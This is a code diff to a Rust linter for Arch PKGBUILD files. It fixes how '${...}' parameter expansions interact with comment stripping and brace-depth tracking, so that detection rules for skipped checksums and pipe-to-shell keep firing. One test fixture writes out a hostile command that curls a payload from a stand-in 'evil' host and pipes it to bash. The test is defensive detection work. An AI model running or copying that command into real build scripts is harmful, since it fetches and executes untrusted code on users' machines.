@@ -592,7 +592,13 @@ fn strip_comment(line: &str) -> &str {
     let mut in_double = false;
     let mut escaped = false;
     let mut prev_boundary = true;
-    for (idx, ch) in line.char_indices() {
+    let mut param_depth = 0u32;
+    // Peekable because `${` has to be consumed as one unit: a `#` inside it is
+    // the length operator or a strip prefix, not a comment. Truncating there
+    // both hid the rest of the line from every rule and left the brace
+    // unbalanced for the callers that track depth.
+    let mut iter = line.char_indices().peekable();
+    while let Some((idx, ch)) = iter.next() {
         if escaped {
             escaped = false;
             prev_boundary = false;
@@ -622,6 +628,13 @@ fn strip_comment(line: &str) -> &str {
         } else if ch == '"' {
             in_double = true;
             prev_boundary = false;
+        } else if ch == '$' && iter.peek().is_some_and(|(_, next)| *next == '{') {
+            iter.next();
+            param_depth += 1;
+            prev_boundary = false;
+        } else if ch == '}' && param_depth > 0 {
+            param_depth -= 1;
+            prev_boundary = true;
         } else if ch == '#' && prev_boundary {
             return line[..idx].trim_end();
         } else {
@@ -841,6 +854,12 @@ pub fn parse_pkgbuild(input: &str) -> Result<FoldedPkgbuild, BluelineError> {
             let mut in_single = false;
             let mut in_double = false;
             let mut escaped = false;
+            // `${...}` braces are tracked apart from the shell body depth.
+            // Counting them as body openers and then stopping at a `#` inside
+            // left depth permanently high, so everything after the function
+            // was swallowed into it and every later top-level rule went dark
+            // with no disclosure.
+            let mut param_depth = 0usize;
             let mut j = idx;
             while j < lines.len() {
                 let text = lines[j];
@@ -888,7 +907,22 @@ pub fn parse_pkgbuild(input: &str) -> Result<FoldedPkgbuild, BluelineError> {
                         in_single = true;
                     } else if ch == '"' {
                         in_double = true;
-                    } else if ch == '#' {
+                    } else if ch == '$' && text_chars.get(k + 1) == Some(&'{') {
+                        if started {
+                            body.push(ch);
+                            body.push('{');
+                        }
+                        param_depth += 1;
+                        k += 2;
+                        continue;
+                    } else if ch == '}' && param_depth > 0 {
+                        if started {
+                            body.push(ch);
+                        }
+                        param_depth -= 1;
+                        k += 1;
+                        continue;
+                    } else if ch == '#' && param_depth == 0 {
                         if started {
                             body.push_str(&text_chars[k..].iter().collect::<String>());
                         }
@@ -3073,6 +3107,67 @@ mod tests {
         let base = parse_pkgbuild("validpgpkeys=(AAA BBB)\n").unwrap();
         let reordered = parse_pkgbuild("validpgpkeys=(BBB AAA)\n").unwrap();
         assert!(check_pair(&base, &reordered).is_empty());
+    }
+
+    #[test]
+    fn parameter_expansion_does_not_swallow_later_metadata() {
+        // A `${#...}` or `${x#...}` in the first function body used to leave the
+        // depth counter high, so every assignment after it was absorbed into
+        // the body. R11 then had no sha256sums array to read and went quiet
+        // with no disclosure, on a PKGBUILD that skips checksum verification.
+        let content = concat!(
+            "pkgname=demo\n",
+            "build() {\n",
+            "  n=${#PKGDEST}\n",
+            "  make\n",
+            "}\n",
+            "pkgver=2.0\n",
+            "sha256sums=('SKIP')\n",
+            "source=('https://x/f.tar.gz')\n",
+        );
+        let folded = parse_pkgbuild(content).unwrap();
+        assert!(
+            folded.scalars.contains_key("pkgver"),
+            "a later top-level assignment must still be read, got {:?}",
+            folded.scalars.keys().collect::<Vec<_>>()
+        );
+        assert!(
+            has_rule(&findings_for(content), "R11_CHECKSUM_SKIP"),
+            "a skipped checksum must still be caught after a parameter expansion"
+        );
+    }
+
+    #[test]
+    fn strip_prefix_expansion_also_leaves_depth_balanced() {
+        let content = concat!(
+            "pkgname=demo\n",
+            "build() {\n",
+            "  p=${x#y}\n",
+            "  make\n",
+            "}\n",
+            "sha256sums=('SKIP')\n",
+        );
+        assert!(has_rule(&findings_for(content), "R11_CHECKSUM_SKIP"));
+    }
+
+    #[test]
+    fn pipe_to_shell_survives_a_parameter_expansion_on_the_line() {
+        // R13 reads the whole line, so a trailing `${#p}` must not truncate it.
+        let content = "build() {\n  curl https://evil/x.tgz ${#p} | bash\n}\n";
+        assert!(
+            has_rule(&findings_for(content), "R13_PIPE_TO_SHELL"),
+            "the pipe-to-shell after a parameter expansion must still fire"
+        );
+    }
+
+    #[test]
+    fn comments_after_a_closed_expansion_are_still_comments() {
+        assert_eq!(strip_comment("a=${x} # note").trim_end(), "a=${x}");
+        assert_eq!(strip_comment("# whole line"), "");
+        assert_eq!(
+            strip_comment("echo '# not a comment'"),
+            "echo '# not a comment'"
+        );
     }
 
     #[test]
